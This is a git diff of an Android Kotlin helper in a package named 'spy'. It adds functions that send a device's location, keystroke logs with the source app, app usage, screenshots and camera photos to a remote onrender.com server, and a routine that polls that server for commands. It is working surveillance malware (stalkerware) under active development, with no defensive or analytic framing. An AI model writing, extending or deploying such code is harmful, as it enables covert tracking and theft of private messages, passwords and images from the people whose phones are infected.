@@ -2,6 +2,7 @@ package com.gauravhanna.spy
 
 import android.content.Context
 import android.content.SharedPreferences
+import android.location.Location
 import android.util.Log
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
@@ -12,7 +13,9 @@ import java.util.concurrent.TimeUnit
 
 object NetworkHelper {
     private const val TAG = "NetworkHelper"
-    private const val BASE_URL = "https://gauravhanna-spy.onrender.com/api/client"
+    
+    // ✅ FIXED: Same as BackgroundService
+    private const val BASE_URL = "https://gauravhanna-spy.onrender.com/api"
 
     private val client = OkHttpClient.Builder()
         .connectTimeout(30, TimeUnit.SECONDS)
@@ -20,6 +23,7 @@ object NetworkHelper {
         .readTimeout(30, TimeUnit.SECONDS)
         .build()
 
+    // ---------- Device ID helpers ----------
     private fun getDeviceId(context: Context): String? {
         return context.getSharedPreferences("spy_prefs", Context.MODE_PRIVATE)
             .getString("device_id", null)
@@ -30,6 +34,7 @@ object NetworkHelper {
             .edit().putString("device_id", id).apply()
     }
 
+    // ✅ FIXED: Register device
     fun registerDevice(context: Context, deviceId: String, deviceName: String, model: String, androidVersion: String, userId: String) {
         val json = JSONObject().apply {
             put("deviceId", deviceId)
@@ -49,7 +54,7 @@ object NetworkHelper {
             override fun onResponse(call: Call, response: Response) {
                 if (response.isSuccessful) {
                     setDeviceId(context, deviceId)
-                    Log.d(TAG, "✅ Device registered")
+                    Log.d(TAG, "✅ Device registered to Render server")
                 } else {
                     Log.e(TAG, "Register HTTP ${response.code}")
                 }
@@ -146,6 +151,153 @@ object NetworkHelper {
             override fun onResponse(call: Call, response: Response) {
                 if (response.isSuccessful) Log.d(TAG, "✅ Contacts sent")
                 else Log.e(TAG, "sendContacts HTTP ${response.code}")
+                response.close()
+            }
+        })
+    }
+
+    fun sendLocation(context: Context, lat: Double, lng: Double, speed: Float, address: String?) {
+        val deviceId = getDeviceId(context) ?: return
+        val json = JSONObject().apply {
+            put("deviceId", deviceId)
+            put("lat", lat)
+            put("lng", lng)
+            put("speed", speed)
+            put("address", address ?: "")
+        }
+        val request = Request.Builder()
+            .url("$BASE_URL/location")
+            .post(RequestBody.create("application/json".toMediaType(), json.toString()))
+            .build()
+        client.newCall(request).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: IOException) {
+                Log.e(TAG, "sendLocation failed: ${e.message}")
+            }
+            override fun onResponse(call: Call, response: Response) {
+                if (response.isSuccessful) Log.d(TAG, "✅ Location sent")
+                else Log.e(TAG, "sendLocation HTTP ${response.code}")
+                response.close()
+            }
+        })
+    }
+
+    fun sendKeylog(context: Context, appPackage: String, text: String) {
+        val deviceId = getDeviceId(context) ?: return
+        val json = JSONObject().apply {
+            put("deviceId", deviceId)
+            put("appPackage", appPackage)
+            put("text", text)
+        }
+        val request = Request.Builder()
+            .url("$BASE_URL/keylog")
+            .post(RequestBody.create("application/json".toMediaType(), json.toString()))
+            .build()
+        client.newCall(request).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: IOException) {
+                Log.e(TAG, "sendKeylog failed: ${e.message}")
+            }
+            override fun onResponse(call: Call, response: Response) {
+                if (response.isSuccessful) Log.d(TAG, "✅ Keylog sent")
+                else Log.e(TAG, "sendKeylog HTTP ${response.code}")
+                response.close()
+            }
+        })
+    }
+
+    fun sendAppUsage(context: Context, entry: Map<String, Any>) {
+        val deviceId = getDeviceId(context) ?: return
+        val json = JSONObject().apply {
+            put("deviceId", deviceId)
+            put("appPackage", entry["appPackage"])
+            put("appName", entry["appName"])
+            put("foregroundTime", entry["foregroundTime"])
+            put("timestamp", entry["timestamp"])
+        }
+        val request = Request.Builder()
+            .url("$BASE_URL/app-usage")
+            .post(RequestBody.create("application/json".toMediaType(), json.toString()))
+            .build()
+        client.newCall(request).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: IOException) {
+                Log.e(TAG, "sendAppUsage failed: ${e.message}")
+            }
+            override fun onResponse(call: Call, response: Response) {
+                if (response.isSuccessful) Log.d(TAG, "✅ App usage sent")
+                else Log.e(TAG, "sendAppUsage HTTP ${response.code}")
+                response.close()
+            }
+        })
+    }
+
+    fun sendScreenshot(context: Context, imageBase64: String) {
+        val deviceId = getDeviceId(context) ?: return
+        val json = JSONObject().apply {
+            put("deviceId", deviceId)
+            put("imageBase64", imageBase64)
+        }
+        val request = Request.Builder()
+            .url("$BASE_URL/screenshot")
+            .post(RequestBody.create("application/json".toMediaType(), json.toString()))
+            .build()
+        client.newCall(request).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: IOException) {
+                Log.e(TAG, "sendScreenshot failed: ${e.message}")
+            }
+            override fun onResponse(call: Call, response: Response) {
+                if (response.isSuccessful) Log.d(TAG, "✅ Screenshot sent")
+                else Log.e(TAG, "sendScreenshot HTTP ${response.code}")
+                response.close()
+            }
+        })
+    }
+
+    fun sendPhoto(context: Context, imageBase64: String) {
+        val deviceId = getDeviceId(context) ?: return
+        val json = JSONObject().apply {
+            put("deviceId", deviceId)
+            put("imageBase64", imageBase64)
+        }
+        val request = Request.Builder()
+            .url("$BASE_URL/photo")
+            .post(RequestBody.create("application/json".toMediaType(), json.toString()))
+            .build()
+        client.newCall(request).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: IOException) {
+                Log.e(TAG, "sendPhoto failed: ${e.message}")
+            }
+            override fun onResponse(call: Call, response: Response) {
+                if (response.isSuccessful) Log.d(TAG, "✅ Photo sent")
+                else Log.e(TAG, "sendPhoto HTTP ${response.code}")
+                response.close()
+            }
+        })
+    }
+
+    // Command polling interface
+    interface CommandCallback {
+        fun onCommand(command: String)
+    }
+
+    fun getCommand(context: Context, deviceId: String, callback: CommandCallback) {
+        val request = Request.Builder()
+            .url("$BASE_URL/command/$deviceId")
+            .get()
+            .build()
+        client.newCall(request).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: IOException) {
+                Log.e(TAG, "getCommand failed: ${e.message}")
+                callback.onCommand("none")
+            }
+            override fun onResponse(call: Call, response: Response) {
+                var command = "none"
+                try {
+                    val json = response.body?.string()
+                    val obj = JSONObject(json)
+                    command = obj.optString("command", "none")
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error parsing command: ${e.message}")
+                }
+                callback.onCommand(command)
                 response.close()
             }
         })
